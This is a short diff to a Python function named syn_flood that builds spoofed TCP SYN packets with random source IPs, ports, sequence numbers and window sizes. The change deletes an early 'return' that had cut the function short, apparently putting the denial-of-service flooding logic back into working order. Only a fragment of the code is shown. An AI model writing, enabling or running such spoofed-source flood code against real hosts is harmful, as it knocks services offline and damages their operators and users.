@@ -25,7 +25,6 @@ def syn_flood(target_ip, target_port, packs_counter):
 
         src_ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
         src_ip = bytes(map(int, src_ip.split(".")))
-        return
         tcp_port = random.randint(1000, 9000)
         sequence = random.randint(1000, 9000)
         window = random.randint(1000, 9000)
